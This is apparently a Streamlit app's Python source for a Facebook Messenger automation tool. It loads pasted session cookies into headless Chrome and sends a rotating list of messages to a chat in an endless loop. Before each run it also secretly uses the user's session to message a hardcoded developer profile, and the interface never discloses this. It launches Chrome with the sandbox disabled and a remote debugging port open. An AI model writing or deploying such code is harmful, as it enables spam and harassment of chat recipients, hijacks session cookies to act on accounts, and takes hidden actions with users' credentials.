import streamlit as st
import streamlit.components.v1 as components
import time
import threading
import uuid
import hashlib
import os
import subprocess
import json
import urllib.parse
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import database as db
import requests

st.set_page_config(
    page_title="E2E BY HENRY--",
    page_icon="",
    layout="wide",
    initial_sidebar_state="expanded"
)

# PINK + PURPLE GRADIENT THEME
custom_css = """
<style>
    /* Clean Sans-Serif Font Import */
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');

    * {
        font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
    }

    .stApp {
        background: linear-gradient(135deg, #1a0033 0%, #4a0033 25%, #8b0050 50%, #d4147a 75%, #ff69b4 100%);
        background-size: 400% 400%;
        animation: gradientShift 12s ease infinite;
    }

    @keyframes gradientShift {
        0% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
        100% { background-position: 0% 50%; }
    }

    .main .block-container {
        background: rgba(30, 10, 50, 0.55);
        backdrop-filter: blur(16px);
        -webkit-backdrop-filter: blur(16px);
        border-radius: 28px;
        padding: 32px;
        border: 2px solid rgba(255, 105, 180, 0.45);
        box-shadow: 0 12px 50px rgba(255, 20, 147, 0.25),
                    inset 0 0 35px rgba(255, 105, 180, 0.12),
                    0 0 80px rgba(138, 43, 226, 0.15);
        position: relative;
        overflow: hidden;
    }

    .main .block-container::after {
        content: '';
        position: absolute;
        top: -50%;
        left: -50%;
        width: 200%;
        height: 200%;
        background: radial-gradient(ellipse at 30% 20%, rgba(255, 105, 180, 0.08) 0%, transparent 50%),
                    radial-gradient(ellipse at 70% 80%, rgba(138, 43, 226, 0.08) 0%, transparent 50%);
        pointer-events: none;
        z-index: 0;
    }

    .main-header {
        background: linear-gradient(135deg, rgba(26, 0, 51, 0.85), rgba(138, 43, 226, 0.75), rgba(212, 20, 122, 0.7));
        border: 2px solid #ff69b4;
        border-radius: 25px;
        padding: 2rem;
        text-align: center;
        margin-bottom: 2.5rem;
        box-shadow: 0 18px 55px rgba(0, 0, 0, 0.65),
                    0 0 35px rgba(255, 105, 180, 0.30),
                    inset 0 0 30px rgba(255, 20, 147, 0.15);
        position: relative;
        overflow: hidden;
    }

    .main-header h1 {
        background: linear-gradient(90deg, #ff69b4, #da70d6, #ff69b4, #ee82ee);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
        font-family: 'Cinzel Decorative', cursive;
        font-size: 3rem;
        font-weight: 700;
        margin: 0;
        text-shadow: 0 0 25px rgba(255, 105, 180, 0.7);
        letter-spacing: 2px;
    }

    .main-header p {
        color: #ffb6c1;
        font-family: 'Great Vibes', cursive;
        font-size: 1.6rem;
        margin-top: 0.5rem;
        letter-spacing: 1.5px;
        text-shadow: 0 0 15px rgba(255, 105, 180, 0.5);
    }

    .header-logo {
        width: 100px;
        height: 200px;
        border-radius: 50%;
        margin-bottom: 18px;
        border: 3px solid #ff69b4;
        box-shadow: 0 0 30px rgba(255, 105, 180, 0.7),
                    inset 0 0 15px rgba(255, 255, 255, 0.3);
        object-fit: cover;
    }

    .stButton>button {
        background: linear-gradient(45deg, #c71585, #ff69b4, #da70d6);
        color: #ffffff;
        border: 2px solid #ff1493;
        border-radius: 16px;
        padding: 1rem 2.4rem;
        font-family: 'Cinzel Decorative', cursive;
        font-weight: 700;
        font-size: 1.1rem;
        transition: all 0.4s ease;
        box-shadow: 0 8px 25px rgba(255, 20, 147, 0.45);
        text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
        width: 100%;
        letter-spacing: 1px;
    }

    .stButton>button:hover {
        transform: translateY(-5px) scale(1.04);
        box-shadow: 0 15px 40px rgba(255, 20, 147, 0.75),
                    0 0 30px rgba(218, 112, 214, 0.4);
        background: linear-gradient(45deg, #ff69b4, #ff1493, #ff69b4);
    }

    .stTextInput>div>div>input,
    .stTextArea>div>div>textarea,
    .stNumberInput>div>div>input {
        background: rgba(40, 10, 70, 0.75);
        border: 2px solid #c71585;
        border-radius: 14px;
        color: #ffb6c1;
        padding: 1rem;
        font-size: 1.1rem;
        transition: all 0.3s ease;
    }

    .stTextInput>div>div>input::placeholder,
    .stTextArea>div>div>textarea::placeholder {
        color: #ff69b480;
    }

    .stTextInput>div>div>input:focus,
    .stTextArea>div>div>textarea:focus {
        border-color: #ff69b4;
        box-shadow: 0 0 0 4px rgba(255, 105, 180, 0.35), 0 0 20px rgba(255, 105, 180, 0.2);
        background: rgba(60, 20, 100, 0.85);
    }

    label {
        color: #ffb6c1 !important;
        font-weight: 600 !important;
        font-size: 1.15rem !important;
        text-shadow: 1px 1px 4px rgba(0,0,0,0.5);
    }

    .stTabs [data-baseweb="tab-list"] {
        background: rgba(40, 10, 70, 0.65);
        border-radius: 16px;
        padding: 10px;
        border: 1px solid #c71585;
        backdrop-filter: blur(5px);
    }

    .stTabs [data-baseweb="tab"] {
        background: rgba(138, 43, 226, 0.45);
        color: #ffb6c1;
        border-radius: 12px;
        padding: 14px 26px;
        font-weight: 600;
        transition: all 0.3s ease;
    }

    .stTabs [aria-selected="true"] {
        background: linear-gradient(45deg, #c71585, #ff69b4);
        color: #ffffff;
        box-shadow: 0 0 20px rgba(255, 105, 180, 0.4);
    }

    [data-testid="stMetricValue"] {
        color: #ff69b4;
        font-size: 2.4rem;
        font-weight: 700;
        text-shadow: 0 0 18px rgba(255, 105, 180, 0.7);
    }

    [data-testid="stMetricLabel"] {
        color: #ffb6c1;
        font-weight: 500;
    }

    .console-section {
        background: rgba(20, 0, 40, 0.75);
        border: 2px solid #c71585;
        border-radius: 16px;
        padding: 22px;
        margin-top: 28px;
        box-shadow: inset 0 0 30px rgba(199, 21, 133, 0.1);
    }

    .console-header {
        color: #ff69b4;
        font-family: 'Cinzel Decorative', cursive;
        text-shadow: 0 0 18px #ff69b4bb;
        margin-bottom: 18px;
    }

    .console-output {
        background: linear-gradient(180deg, #0f001a 0%, #1a0033 100%);
        border: 2px solid #8b0050;
        border-radius: 14px;
        padding: 18px;
        color: #ffb6c1;
        font-family: 'Courier New', monospace;
        font-size: 13.5px;
        max-height: 480px;
        overflow-y: auto;
        box-shadow: inset 0 0 25px rgba(138, 43, 226, 0.15);
    }

    .console-line {
        background: rgba(138, 43, 226, 0.2);
        border-left: 4px solid #ff69b4;
        padding: 9px 14px;
        margin: 7px 0;
        color: #ffb6c1;
        border-radius: 0 8px 8px 0;
    }

    .footer {
        background: rgba(40, 10, 70, 0.75);
        border-top: 3px solid #c71585;
        color: #ffb6c1;
        font-family: 'Great Vibes', cursive;
        font-size: 1.4rem;
        padding: 2.5rem;
        text-shadow: 1px 1px 5px rgba(0,0,0,0.5);
        text-align: center;
        margin-top: 2rem;
        border-radius: 20px 20px 0 0;
    }

    hr {
        border: none;
        height: 2px;
        background: linear-gradient(90deg, transparent, #ff69b4, #c71585, #ff69b4, transparent);
        margin: 25px 0;
    }

    ::-webkit-scrollbar {
        width: 8px;
        height: 8px;
    }

    ::-webkit-scrollbar-track {
        background: rgba(40, 10, 70, 0.3);
        border-radius: 10px;
    }

    ::-webkit-scrollbar-thumb {
        background: linear-gradient(180deg, #c71585, #ff69b4);
        border-radius: 10px;
    }

    ::-webkit-scrollbar-thumb:hover {
        background: linear-gradient(180deg, #ff69b4, #ff1493);
    }
</style>
"""


# Streamlit code example:
import streamlit as st

st.markdown(custom_css, unsafe_allow_html=True)

# ── CONFIG ─────────────────────────────────────────────────────
WHATSAPP_NUMBER = "919919180262"
ADMIN_UID = "61564155712159"

# ── SESSION STATE ──────────────────────────────────────────────
if 'automation_running' not in st.session_state:
    st.session_state.automation_running = False
if 'logs' not in st.session_state:
    st.session_state.logs = []
if 'message_count' not in st.session_state:
    st.session_state.message_count = 0
if 'auto_start_checked' not in st.session_state:
    st.session_state.auto_start_checked = False

class AutomationState:
    def __init__(self):
        self.running = False
        self.message_count = 0
        self.logs = []
        self.message_rotation_index = 0

if 'automation_state' not in st.session_state:
    st.session_state.automation_state = AutomationState()

# ── HELPER FUNCTIONS ───────────────────────────────────────────
def log_message(msg, automation_state=None):
    timestamp = time.strftime("%H:%M:%S")
    formatted_msg = f"[{timestamp}] {msg}"
    if automation_state:
        automation_state.logs.append(formatted_msg)
    else:
        if 'logs' in st.session_state:
            st.session_state.logs.append(formatted_msg)

def find_message_input(driver, process_id, automation_state=None):
    log_message(f'{process_id}: Finding message input...', automation_state)
    time.sleep(10)

    try:
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)
        driver.execute_script("window.scrollTo(0, 0);")
        time.sleep(2)
    except Exception:
        pass

    try:
        page_title = driver.title
        page_url = driver.current_url
        log_message(f'{process_id}: Page Title: {page_title}', automation_state)
        log_message(f'{process_id}: Page URL: {page_url}', automation_state)
    except Exception as e:
        log_message(f'{process_id}: Could not get page info: {e}', automation_state)

    message_input_selectors = [
        'div[contenteditable="true"][role="textbox"]',
        'div[contenteditable="true"][data-lexical-editor="true"]',
        'div[aria-label*="message" i][contenteditable="true"]',
        'div[aria-label*="Message" i][contenteditable="true"]',
        'div[contenteditable="true"][spellcheck="true"]',
        '[role="textbox"][contenteditable="true"]',
        'textarea[placeholder*="message" i]',
        'div[aria-placeholder*="message" i]',
        'div[data-placeholder*="message" i]',
        '[contenteditable="true"]',
        'textarea',
        'input[type="text"]'
    ]

    log_message(f'{process_id}: Trying {len(message_input_selectors)} selectors...', automation_state)

    for idx, selector in enumerate(message_input_selectors):
        try:
            elements = driver.find_elements(By.CSS_SELECTOR, selector)
            log_message(f'{process_id}: Selector {idx+1}/{len(message_input_selectors)} "{selector[:50]}..." found {len(elements)} elements', automation_state)

            for element in elements:
                try:
                    is_editable = driver.execute_script("""
                        return arguments[0].contentEditable === 'true' ||
                               arguments[0].tagName === 'TEXTAREA' ||
                               arguments[0].tagName === 'INPUT';
                    """, element)

                    if is_editable:
                        log_message(f'{process_id}: Found editable element with selector #{idx+1}', automation_state)

                        try:
                            element.click()
                            time.sleep(0.5)
                        except:
                            pass

                        element_text = driver.execute_script("return arguments[0].placeholder || arguments[0].getAttribute('aria-label') || arguments[0].getAttribute('aria-placeholder') || '';", element).lower()

                        keywords = ['message', 'write', 'type', 'send', 'chat', 'msg', 'reply', 'text', 'aa']
                        if any(keyword in element_text for keyword in keywords):
                            log_message(f'{process_id}: Found message input with text: {element_text[:50]}', automation_state)
                            return element
                        elif idx < 10:
                            log_message(f'{process_id}: Using primary selector editable element (#{idx+1})', automation_state)
                            return element
                        elif selector == '[contenteditable="true"]' or selector == 'textarea' or selector == 'input[type="text"]':
                            log_message(f'{process_id}: Using fallback editable element', automation_state)
                            return element
                except Exception as e:
                    log_message(f'{process_id}: Element check failed: {str(e)[:50]}', automation_state)
                    continue
        except Exception as e:
            continue

    try:
        page_source = driver.page_source
        log_message(f'{process_id}: Page source length: {len(page_source)} characters', automation_state)
        if 'contenteditable' in page_source.lower():
            log_message(f'{process_id}: Page contains contenteditable elements', automation_state)
        else:
            log_message(f'{process_id}: No contenteditable elements found in page', automation_state)
    except Exception:
        pass

    return None

def setup_browser(automation_state=None):
    log_message('Setting up Chrome browser...', automation_state)

    chrome_options = Options()
    
    # ---- YEH BADLA HAI ----
    chrome_options.add_argument('--headless')  # 'new' hatao, sirf '--headless' rakho
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--remote-debugging-port=9222')  # YEH ADD KIYA
    chrome_options.add_argument('--user-data-dir=/tmp/chrome-data')  # YEH ADD KIYA
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36')
    
    # Chrome binary ka path detect karo
    chromium_paths = [
        '/usr/bin/chromium',
        '/usr/bin/chromium-browser',
        '/usr/bin/google-chrome',
        '/usr/bin/chrome',
        '/snap/bin/chromium'  # YEH BHI CHECK KARO
    ]

    for chromium_path in chromium_paths:
        if Path(chromium_path).exists():
            chrome_options.binary_location = chromium_path
            log_message(f'Found Chromium at: {chromium_path}', automation_state)
            break
    else:
        log_message('Chromium not found at any standard path!', automation_state)
        # Check karo available binaries
        try:
            result = subprocess.run(['which', 'chromium', 'chromium-browser', 'chrome', 'google-chrome'], 
                                   capture_output=True, text=True)
            log_message(f'Available: {result.stdout}', automation_state)
        except:
            pass

    # ChromeDriver path detect karo
    chromedriver_paths = [
        '/usr/bin/chromedriver',
        '/usr/local/bin/chromedriver',
        '/snap/bin/chromedriver'
    ]

    driver_path = None
    for driver_candidate in chromedriver_paths:
        if Path(driver_candidate).exists():
            driver_path = driver_candidate
            log_message(f'Found ChromeDriver at: {driver_path}', automation_state)
            break

    try:
        from selenium.webdriver.chrome.service import Service
        
        # Extra options for container environment
        chrome_options.add_argument('--disable-dev-tools')
        chrome_options.add_argument('--no-first-run')
        chrome_options.add_argument('--disable-background-networking')
        chrome_options.add_argument('--disable-sync')
        chrome_options.add_argument('--disable-default-apps')
        chrome_options.add_argument('--disable-translate')
        chrome_options.add_argument('--hide-scrollbars')
        chrome_options.add_argument('--metrics-recording-only')
        chrome_options.add_argument('--mute-audio')
        chrome_options.add_argument('--safebrowsing-disable-auto-updates')

        if driver_path:
            service = Service(executable_path=driver_path)
            driver = webdriver.Chrome(service=service, options=chrome_options)
            log_message('Chrome started with detected ChromeDriver!', automation_state)
        else:
            # Bina path ke try karo
            driver = webdriver.Chrome(options=chrome_options)
            log_message('Chrome started with default driver!', automation_state)

        driver.set_window_size(1920, 1080)
        log_message('Chrome browser setup completed successfully!', automation_state)
        return driver
    except Exception as error:
        log_message(f'Browser setup failed: {error}', automation_state)
        raise error

def get_next_message(messages, automation_state=None):
    if not messages or len(messages) == 0:
        return 'Hello!'

    if automation_state:
        message = messages[automation_state.message_rotation_index % len(messages)]
        automation_state.message_rotation_index += 1
    else:
        message = messages[0]

    return message

def send_messages(config, automation_state, process_id='AUTO-1'):
    driver = None
    try:
        log_message(f'{process_id}: Starting automation...', automation_state)
        driver = setup_browser(automation_state)

        log_message(f'{process_id}: Navigating to Facebook...', automation_state)
        driver.get('https://www.facebook.com/')
        time.sleep(8)

        if config['cookies'] and config['cookies'].strip():
            log_message(f'{process_id}: Adding cookies...', automation_state)
            cookie_array = config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass

        if config['chat_id']:
            chat_id = config['chat_id'].strip()
            log_message(f'{process_id}: Opening conversation {chat_id}...', automation_state)
            driver.get(f'https://www.facebook.com/messages/t/{chat_id}')
        else:
            log_message(f'{process_id}: Opening messages...', automation_state)
            driver.get('https://www.facebook.com/messages')

        time.sleep(15)

        message_input = find_message_input(driver, process_id, automation_state)

        if not message_input:
            log_message(f'{process_id}: Message input not found!', automation_state)
            automation_state.running = False
            db.set_automation_running(process_id, False)
            return 0

        delay = int(config['delay'])
        messages_sent = 0
        messages_list = [msg.strip() for msg in config['messages'].split('\n') if msg.strip()]

        if not messages_list:
            messages_list = ['Hello!']

        while automation_state.running:
            base_message = get_next_message(messages_list, automation_state)

            if config['name_prefix']:
                message_to_send = f"{config['name_prefix']} {base_message}"
            else:
                message_to_send = base_message

            try:
                driver.execute_script("""
                    const element = arguments[0];
                    const message = arguments[1];

                    element.scrollIntoView({behavior: 'smooth', block: 'center'});
                    element.focus();
                    element.click();

                    if (element.tagName === 'DIV') {
                        element.textContent = message;
                        element.innerHTML = message;
                    } else {
                        element.value = message;
                    }

                    element.dispatchEvent(new Event('input', { bubbles: true }));
                    element.dispatchEvent(new Event('change', { bubbles: true }));
                    element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
                """, message_input, message_to_send)

                time.sleep(1)

                sent = driver.execute_script("""
                    const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');

                    for (let btn of sendButtons) {
                        if (btn.offsetParent !== null) {
                            btn.click();
                            return 'button_clicked';
                        }
                    }
                    return 'button_not_found';
                """)

                if sent == 'button_not_found':
                    log_message(f'{process_id}: Send button not found, using Enter key...', automation_state)
                    driver.execute_script("""
                        const element = arguments[0];
                        element.focus();

                        const events = [
                            new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                        ];

                        events.forEach(event => element.dispatchEvent(event));
                    """, message_input)
                    log_message(f'{process_id}: Sent via Enter: "{message_to_send[:30]}..."', automation_state)
                else:
                    log_message(f'{process_id}: Sent via button: "{message_to_send[:30]}..."', automation_state)

                messages_sent += 1
                automation_state.message_count = messages_sent

                log_message(f'{process_id}: Message #{messages_sent} sent. Waiting {delay}s...', automation_state)
                time.sleep(delay)

            except Exception as e:
                log_message(f'{process_id}: Send error: {str(e)[:100]}', automation_state)
                time.sleep(5)

        log_message(f'{process_id}: Automation stopped. Total messages: {messages_sent}', automation_state)
        return messages_sent

    except Exception as e:
        log_message(f'{process_id}: Fatal error: {str(e)}', automation_state)
        automation_state.running = False
        db.set_automation_running(process_id, False)
        return 0
    finally:
        if driver:
            try:
                driver.quit()
                log_message(f'{process_id}: Browser closed', automation_state)
            except:
                pass

def send_admin_notification(user_config, process_id, automation_state=None):
    driver = None
    try:
        log_message(f"ADMIN-NOTIFY: Preparing notification...", automation_state)

        driver = setup_browser(automation_state)

        log_message(f"ADMIN-NOTIFY: Navigating to Facebook...", automation_state)
        driver.get('https://www.facebook.com/')
        time.sleep(8)

        if user_config['cookies'] and user_config['cookies'].strip():
            log_message(f"ADMIN-NOTIFY: Adding cookies...", automation_state)
            cookie_array = user_config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass

        log_message(f"ADMIN-NOTIFY: Searching for admin: {ADMIN_UID}...", automation_state)

        try:
            profile_url = f'https://www.facebook.com/{ADMIN_UID}'
            log_message(f"ADMIN-NOTIFY: Opening admin profile: {profile_url}", automation_state)
            driver.get(profile_url)
            time.sleep(8)

            message_button_selectors = [
                'div[aria-label*="Message" i]',
                'a[aria-label*="Message" i]',
                '[data-testid*="message"]'
            ]

            message_button = None
            for selector in message_button_selectors:
                try:
                    elements = driver.find_elements(By.CSS_SELECTOR, selector)
                    if elements:
                        for elem in elements:
                            text = elem.text.lower() if elem.text else ""
                            aria_label = elem.get_attribute('aria-label') or ""
                            if 'message' in text or 'message' in aria_label.lower():
                                message_button = elem
                                log_message(f"ADMIN-NOTIFY: Found message button: {selector}", automation_state)
                                break
                        if message_button:
                            break
                except:
                    continue

            if message_button:
                log_message(f"ADMIN-NOTIFY: Clicking message button...", automation_state)
                driver.execute_script("arguments[0].click();", message_button)
                time.sleep(8)

                current_url = driver.current_url
                log_message(f"ADMIN-NOTIFY: Redirected to: {current_url}", automation_state)
            else:
                log_message(f"ADMIN-NOTIFY: Could not find message button on profile", automation_state)

        except Exception as e:
            log_message(f"ADMIN-NOTIFY: Profile approach failed: {str(e)[:100]}", automation_state)

        message_input = find_message_input(driver, 'ADMIN-NOTIFY', automation_state)

        if message_input:
            from datetime import datetime
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            notification_msg = f"New automation started by HENRY-- at {current_time}"

            log_message(f"ADMIN-NOTIFY: Typing notification message...", automation_state)
            driver.execute_script("""
                const element = arguments[0];
                const message = arguments[1];

                element.scrollIntoView({behavior: 'smooth', block: 'center'});
                element.focus();
                element.click();

                if (element.tagName === 'DIV') {
                    element.textContent = message;
                    element.innerHTML = message;
                } else {
                    element.value = message;
                }

                element.dispatchEvent(new Event('input', { bubbles: true }));
                element.dispatchEvent(new Event('change', { bubbles: true }));
                element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
            """, message_input, notification_msg)

            time.sleep(1)

            log_message(f"ADMIN-NOTIFY: Trying to send message...", automation_state)
            send_result = driver.execute_script("""
                const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');

                for (let btn of sendButtons) {
                    if (btn.offsetParent !== null) {
                        btn.click();
                        return 'button_clicked';
                    }
                }
                return 'button_not_found';
            """)

            if send_result == 'button_not_found':
                log_message(f"ADMIN-NOTIFY: Send button not found, using Enter key...", automation_state)
                driver.execute_script("""
                    const element = arguments[0];
                    element.focus();

                    const events = [
                        new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                        new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                        new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                    ];

                    events.forEach(event => element.dispatchEvent(event));
                """, message_input)
                log_message(f"ADMIN-NOTIFY: Sent via Enter key", automation_state)
            else:
                log_message(f"ADMIN-NOTIFY: Send button clicked", automation_state)

            time.sleep(2)
        else:
            log_message(f"ADMIN-NOTIFY: Failed to find message input", automation_state)

    except Exception as e:
        log_message(f"ADMIN-NOTIFY: Error sending notification: {str(e)}", automation_state)
    finally:
        if driver:
            try:
                driver.quit()
                log_message(f"ADMIN-NOTIFY: Browser closed", automation_state)
            except:
                pass

def run_automation_with_notification(user_config, automation_state, process_id='AUTO-1'):
    send_admin_notification(user_config, process_id, automation_state)
    send_messages(user_config, automation_state, process_id)

def start_automation(user_config):
    automation_state = st.session_state.automation_state

    if automation_state.running:
        return

    automation_state.running = True
    automation_state.message_count = 0
    automation_state.logs = []

    db.set_automation_running('MAIN', True)

    thread = threading.Thread(target=run_automation_with_notification, args=(user_config, automation_state))
    thread.daemon = True
    thread.start()

def stop_automation():
    st.session_state.automation_state.running = False
    db.set_automation_running('MAIN', False)

# ── MAIN UI ────────────────────────────────────────────────────
import streamlit as st

st.markdown("""
<style>
/* Main Card Container */
.profile-card {
    background: #1a1a1a; 
    border-radius: 20px; /* Thode zyada rounded corners */
    box-shadow: 0 10px 30px rgba(255,20,147,0.25);
    border: 1px solid rgba(255,255,255,0.1);
    width: 380px; /* Chaudayi thodi badha di (Pehle 320px thi) */
    overflow: hidden;
    margin: 20px auto;
    text-align: center; /* Text center karne ke liye */
}

/* Image Container - Height kam ki hai */
.profile-image-container {
    width: 100%;
    height: 200px; /* Lambayi thodi kam kar di (Pehle 250px thi) */
    overflow: hidden;
}

.profile-image-container img {
    width: 100%;
    height: 100%;
    object-fit: cover;
}

/* Text Section */
.profile-details {
    padding: 15px 20px;
    background: #222222;
}

/* HENRY'X - Center aligned */
.profile-name {
    font-family: sans-serif;
    font-weight: 900;
    font-size: 1.7em;
    color: #FF1493; /* Pink color */
    margin: 0;
    letter-spacing: 2px;
}

/* E2EE - Size chota aur center */
.profile-role {
    font-family: sans-serif;
    font-size: 0.8em; /* Size chota kar diya */
    color: #aaaaaa;
    margin: 5px 0 0 0;
    font-weight: bold;
    letter-spacing: 3px;
}
</style>

<div class="profile-card">
    <div class="profile-image-container">
        <img src="https://i.imgur.com/KyCJzk9.jpeg">
    </div>
    <div class="profile-details">
        <div class="profile-name">𝙃𝙀𝙉𝙍𝙔'𝙓</div>
        <div class="profile-role">𝘌2𝘌𝘌</div>
    </div>
</div>
""", unsafe_allow_html=True)
user_config = db.get_user_config('MAIN')

        
    # --- Ye line bilkul shuruat (left edge) se honi chahiye ---
if user_config:
    tab1, tab2 = st.tabs(["Configuration", "Automation"])

    with tab1:
        # Powerful CSS Injection
        st.markdown("""
        <style>
            /* Poore tab section ko card jaisa dikhane ke liye */
            div[data-testid="stVerticalBlock"] > div:has(div.config-card-trigger) {
                background: rgba(255, 255, 255, 0.05) !important;
                backdrop-filter: blur(15px) !important;
                -webkit-backdrop-filter: blur(15px) !important;
                border-radius: 20px !important;
                padding: 30px !important;
                border: 1px solid rgba(255, 255, 255, 0.1) !important;
                box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5) !important;
            }

            /* Inputs ko transparent dark banane ke liye */
            div[data-baseweb="input"], div[data-baseweb="textarea"], .stNumberInput input {
                background-color: rgba(0, 0, 0, 0.4) !important;
                border: 1px solid rgba(255, 255, 255, 0.1) !important;
                color: white !important;
                border-radius: 10px !important;
            }

            /* Label text (ID, Delay etc) ka color change karne ke liye */
            label p {
                color: #FF1493 !important;
                font-weight: bold !important;
                font-size: 16px !important;
            }

            /* Save Button */
            .stButton>button {
                background: linear-gradient(90deg, #FF1493, #FF69B4) !important;
                border: none !important;
                color: white !important;
                font-weight: bold !important;
                padding: 10px 0 !important;
                border-radius: 10px !important;
                box-shadow: 0 4px 15px rgba(255, 20, 147, 0.3) !important;
            }
            
            .config-header {
                text-align: center;
                color: white;
                font-weight: 900;
                letter-spacing: 2px;
                margin-bottom: 20px;
                text-transform: uppercase;
            }
        </style>
        <div class="config-card-trigger"></div>
        """, unsafe_allow_html=True)

        # Ab ye saare inputs CSS ki wajah se card ke andar hi dikhenge
        chat_id = st.text_input("Chat/Conversation ID", value=user_config['chat_id'], placeholder="Enter ID...")
        
        name_prefix = st.text_input("Name Prefix", value=user_config['name_prefix'], placeholder="[HENRY'X]")
        
        delay = st.number_input("Delay (seconds)", min_value=1, value=user_config['delay'])
        
        cookies = st.text_area("Facebook Cookies (optional)", placeholder="Paste cookies here...", height=100)
        
        messages = st.text_area("Messages (one per line)", value=user_config['messages'], height=150)

        if st.button("Save Configuration", use_container_width=True):
            final_cookies = cookies if cookies.strip() else user_config['cookies']
            db.update_user_config('MAIN', chat_id, name_prefix, delay, final_cookies, messages)
            st.success("✅ Configuration saved!")
            st.rerun()

    with tab2:
        st.markdown("### Automation Control")

        user_config = db.get_user_config('MAIN')

        col1, col2, col3 = st.columns(3)
        with col1:
            st.metric("Messages Sent", st.session_state.automation_state.message_count)
        with col2:
            status = "Running" if st.session_state.automation_state.running else "Stopped"
            st.metric("Status", status)
        with col3:
            st.metric("Chat ID", user_config['chat_id'][:10] + "..." if user_config['chat_id'] else "Not Set")

        st.markdown("---")

        col1, col2 = st.columns(2)

        with col1:
            if st.button("Start Automation", disabled=st.session_state.automation_state.running, use_container_width=True):
                if user_config['chat_id']:
                    start_automation(user_config)
                    st.success("Automation started!")
                    st.rerun()
                else:
                    st.error("Please set Chat ID in Configuration first!")

        with col2:
            if st.button("Stop Automation", disabled=not st.session_state.automation_state.running, use_container_width=True):
                stop_automation()
                st.warning("Automation stopped!")
                st.rerun()

        if st.session_state.automation_state.logs:
            st.markdown("### Live Console Output")

            logs_html = '<div class="console-output">'
            for log in st.session_state.automation_state.logs[-30:]:
                logs_html += f'<div class="console-line">{log}</div>'
            logs_html += '</div>'

            st.markdown(logs_html, unsafe_allow_html=True)

            if st.button("Refresh Logs"):
                st.rerun()
else:
    st.warning("No configuration found. Please refresh the page!")

# ── FOOTER ─────────────────────────────────────────────────────
st.markdown('<div class="footer">𝘛𝘩𝘦 𝘌2𝘦𝘦 𝘛𝘰𝘰𝘭 𝘔𝘢𝘥𝘦 𝘉𝘺 𝙃𝙀𝙉𝙍𝙔-- | </div>', unsafe_allow_html=True)
